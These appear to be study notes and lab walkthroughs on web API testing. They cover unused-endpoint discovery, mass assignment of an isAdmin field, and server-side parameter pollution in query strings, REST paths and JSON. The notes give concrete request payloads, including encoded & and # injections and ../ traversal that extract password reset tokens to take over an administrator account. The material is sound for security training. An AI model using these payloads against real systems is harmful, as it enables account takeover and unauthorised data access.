### Try changing HTTP method, media type, params (check which are required), check error messages
#### Changing the content type may enable you to:
- Trigger errors that disclose useful information.
- Bypass flawed defenses.
- Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

#### Lab: Finding and exploiting an unused API endpoint
We have an endpoint:
GET /api/products/3/price => {"price":"$40.29","message":"&#x1F525; 10 users have purchased this in the last 28 minutes"}
If we change GET to OPTIONS we can see in the response headers: `Allow: GET, PATCH`
So we can try to send PATCH request (with the `Content-Type: application/json`) to update the price of the product
PATCH /api/products/3/price req.body: {"price": 0}
It'll update the price

> Note
> 
> `PUT /api/user/update` may mean that last word `update` can be substituted with `delete` or `add`

### Mass assignment vulnerabilities
Software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

#### Identifying hidden params
Consider a PATCH `/api/users/` request, which enables users to update their username and email, and includes the following JSON: 
```
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```
A concurrent `GET /api/users/123` request returns the following JSON: 
```
{
    "id": 123,
    "name": "john doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```
To test whether you can modify the enumerated isAdmin parameter value, add it to the PATCH request: 
```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false
}
```
In addition, send a PATCH request with an invalid isAdmin parameter value: 
```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo",
}
```
If the application behaves differently, this may suggest that the invalid value impacts the query logic, but the valid value doesn't. This may indicate that the parameter can be successfully updated by the user. 

You can then send a `PATCH` request with the `isAdmin` parameter value set to `true`, to try and exploit the vulnerability: 
```
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true,
}
```


## Server-side parameter pollution 
Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding.
Test user input for query parameters, form fields, headers, and URL path parameters

### Testing for server-side parameter pollution in the query string
To test for server-side parameter pollution in the query string, place query syntax characters like #, &, and = in your input and observe how the application responds. 

Consider a vulnerable application that enables you to search for other users based on their username. When you search for a user, your browser makes the following request: 
```
GET /userSearch?name=peter&back=/home
```
To retrieve user information, the server queries an internal API with the following request: 
```
GET /users/search?name=peter&publicProfile=true
```

### Truncating query strings
You can use a URL-encoded `#` character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the `#` character.
For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%23foo&back=/home
```
The front-end will try to access the following URL:
```
GET /users/search?name=peter#foo&publicProfile=true
```
> Note
> 
> It's essential that you URL-encode the `#` character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

Review the response for clues about whether the query has been truncated. For example, if the response returns the user `peter`, the server-side query may have been truncated. If an `Invalid name` error message is returned, the application may have treated `foo` as part of the username. This suggests that the server-side request may not have been truncated. 

__If you're able to truncate the server-side request, this removes the requirement for the `publicProfile` field to be set to `true`. You may be able to exploit this to return non-public user profiles.__ 

### Injecting invalid parameters 
You can use an URL-encoded `&` character to attempt to add a second parameter to the server-side request.

For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%26foo=xyz&back=/home
```
 This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&foo=xyz&publicProfile=true
```

Review the response for clues about how the additional parameter is parsed. For example, if the response is unchanged this may indicate that the parameter was successfully injected but ignored by the application.

To build up a more complete picture, you'll need to test further. 

### Injecting valid parameters
If you're able to modify the query string, you can then attempt to add a second valid parameter to the server-side request.  

For example, if you've identified the `email` parameter, you could add it to the query string as follows:
```
GET /userSearch?name=peter%26email=foo&back=/home
```
This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&email=foo&publicProfile=true
```
Review the response for clues about how the additional parameter is parsed. 

### Overriding existing parameters
To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, you could modify the query string to the following:
```
GET /userSearch?name=peter%26name=carlos&back=/home
```
 This results in the following server-side request to the internal API:
```
GET /users/search?name=peter&name=carlos&publicProfile=true
```
The internal API interprets two name parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example: 
- PHP parses the last parameter only. This would result in a user search for carlos.
- ASP.NET combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.
- Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.

__If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add `name=administrator` to the request. This may enable you to log in as the administrator user.__ 

### Lab: Exploiting server-side parameter pollution in a query string
Let's say there's a reset password endpoint:
```
POST /forgot-password
csrf=D14LzFHHUPJ9Dhxs1wUXAFuZhHymOd1P&username=administrator
```
Try to add another param to body, e.g.:
`username=administrator%26ff=44`
we get back a response:
`{"error": "Parameter is not supported."}`
Then we try to truncate the body:
`username=administrator%23`
And we get back a response:
`"error": "Field not specified."`
Which suggests that it expects another body param, called `"field"`, so we add it:
`username=administrator%26field=33%23`
And we get a response:
`{"type":"ClientError","code":400,"error":"Invalid field."}`
Here we can bruteforce "field" to get something other than invalid field
Later we find out that we can set `field=email` or `field=username` or `field=reset_token`
And as it turns out, if we do that, it'll return us the value of the `reset_token` from the database in the response:
`{"result":"stdow0449ahxbzaruxv6qdi826mkqh07","type":"reset_token"}`
We can then use this token for password reset
__Do not forget to check static/resetpassword.js file or other static files__

### Testing for server-side parameter pollution in REST paths
Consider an application that enables you to edit user profiles based on their username. Requests are sent to the following endpoint:
```
GET /edit_profile.php?name=peter
```
 This results in the following server-side request:
```
GET /api/private/users/peter
```
An attacker may be able to manipulate server-side URL path parameters to exploit the API. To test for this vulnerability, add path traversal sequences to modify parameters and observe how the application responds.

You could submit URL-encoded peter/../admin as the value of the name parameter:
```
GET /edit_profile.php?name=peter%2f..%2fadmin
```
This may result in the following server-side request:
```
GET /api/private/users/peter/../admin
```
If the server-side client or back-end API normalize this path, it may be resolved to `/api/private/users/admin`. 

### Lab: Exploiting server-side parameter pollution in a REST URL
If there's a password reset endpoint:
POST /forgot-password req.body: csrf=ecIew6LswCIcl4AxMNjx8iWKDQr5wfX8&username=administrator
Try to change the last part of the body the following:
username=./administrator
username=administrator#
username=administrator?
And see the response

Change the value of the username parameter from ../administrator to ../%23. Notice the Invalid route response.

Incrementally add further ../ sequences until you reach ../../../../%23 Notice that this returns a Not found response. This indicates that you've navigated outside the API root.

At this level, add some common API definition filenames to the URL path. For example, submit the following:
username=../../../../openapi.json%23 

Notice that this returns an error message, which contains the following API endpoint for finding users:
/api/internal/v1/users/{username}/field/{field} 
Notice that this endpoint indicates that the URL path includes a parameter called field.

Later we try to send: username=administrator/field/username#
because we want to try to get username but we get a response:
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}

__It we send req.body in the following way: username=administrator/field/username# we get an err but if we send it in this way: username=../../v1/users/administrator/field/username%23 we get back a username__

In static/passwordReset we saw passwordResetToken in the url so we try:
username=../../v1/users/administrator/field/passwordResetToken%23
And we get back password reset token. (look at static/passwordReset.js file and apply the reset token)


## Testing for server-side parameter pollution in structured data formats
An attacker may be able to manipulate parameters to exploit vulnerabilities in the server's processing of other structured data formats, such as a JSON or XML. To test for this, inject unexpected structured data into user inputs and see how the server responds. 

Consider an application that enables users to edit their profile, then applies their changes with a request to a server-side API. When you edit your name, your browser makes the following request:
```
POST /myaccount
name=peter
```

This results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter"}
```

You can attempt to add the access_level parameter to the request as follows:
```
POST /myaccount
name=peter","access_level":"administrator
```

If the user input is added to the server-side JSON data without adequate validation or sanitization, this results in the following server-side request:
```
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```
This may result in the user peter being given administrator access. 


Consider a similar example, but where the client-side user input is in JSON data. When you edit your name, your browser makes the following request:
```
POST /myaccount
{"name": "peter"}
```

This results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter"}
```

You can attempt to add the access_level parameter to the request as follows:
```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

If the user input is decoded, then added to the server-side JSON data without adequate encoding, this results in the following server-side request:
```
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```
Again, this may result in the user peter being given administrator access.

Structured format injection can also occur in responses. For example, this can occur if user input is stored securely in a database, then embedded into a JSON response from a back-end API without adequate encoding. You can usually detect and exploit structured format injection in responses in the same way you can in requests. 

> Note
> 
> This example below is in JSON, but server-side parameter pollution can occur in any structured data format. For an example in XML, see the XInclude attacks section in the XML external entity (XXE) injection topic. 

